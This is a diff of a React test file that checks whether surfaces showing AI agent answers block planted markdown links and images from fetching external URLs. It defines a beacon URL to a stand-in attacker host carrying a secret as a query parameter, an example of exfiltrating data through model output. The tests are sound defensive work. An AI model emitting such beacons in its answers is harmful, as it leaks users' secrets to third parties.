@@ -23,9 +23,13 @@ import { MemoryRouter } from "react-router-dom";
 import { describe, expect, it, vi } from "vitest";
 
 import { agentMarkdownComponents, externalHost } from "../features/agentQA/agentMarkdown";
+import { AgentTurn } from "../features/agentQA/AgentTurn";
+import { buildAgentTurnLabels } from "../features/agentQA/agentTurnLabels";
 import { ApprovalCard } from "../features/agentQA/ApprovalCard";
-import { agentQAUrlTransform, CitationAnchor } from "../features/agentQA/CitationAnchor";
+import { CitationLink } from "../features/agentQA/CitationLink";
+import { agentQAUrlTransform } from "../features/agentQA/citationUtils";
 import DigestBody from "../features/inbox/components/DigestBody";
+import { getMessages } from "../i18n";
 import type { PendingApprovalPayload } from "../services/agentApi";
 
 const BEACON = "https://attacker.example/p.png?d=SECRET";
@@ -90,21 +94,46 @@ describe("the shared agent markdown components", () => {
 });
 
 describe("each surface that renders model output", () => {
-    it("agent answers with citations (CitationAnchor fallback)", () => {
+    it("agent answers with citations (CitationLink fallback)", () => {
         const { container } = render(
             <ReactMarkdown
                 urlTransform={agentQAUrlTransform}
                 components={{
                     ...agentMarkdownComponents,
                     a: ({ href, children }) => (
-                        <CitationAnchor href={href} isDark={false} sourcesById={new Map()}>
+                        <CitationLink
+                            href={href}
+                            isDark={false}
+                            sourcesById={new Map()}
+                            onPreview={vi.fn()}
+                        >
                             {children}
-                        </CitationAnchor>
+                        </CitationLink>
                     ),
                 }}
             >
                 {PLANTED}
             </ReactMarkdown>
+        );
+        expectNoFetch(container);
+        expectLabelledLink(container);
+    });
+
+    it("the answer turn every agent surface renders", () => {
+        const { container } = render(
+            <CssVarsProvider>
+                <AgentTurn
+                    answer={PLANTED}
+                    answerSources={[]}
+                    askedQuery="what is the status?"
+                    askError={null}
+                    isCurrent={false}
+                    isDark={false}
+                    labels={buildAgentTurnLabels(getMessages("en"), "spotlight")}
+                    toolEvents={[]}
+                    onPreview={vi.fn()}
+                />
+            </CssVarsProvider>
         );
         expectNoFetch(container);
         expectLabelledLink(container);
@@ -170,7 +199,7 @@ describe("no model-output renderer is missing the guard", () => {
     // have their own rules.
     const MODEL_RENDERERS = [
         "features/spotlight/SpotlightContent.tsx",
-        "features/agentQA/AgentQAConversation.tsx",
+        "features/agentQA/AgentTurn.tsx",
         "features/threadAsk/ThreadAskModal.tsx",
         "features/noteAsk/NoteAskModal.tsx",
         "features/agentQA/approval/NoteWritePreview.tsx",
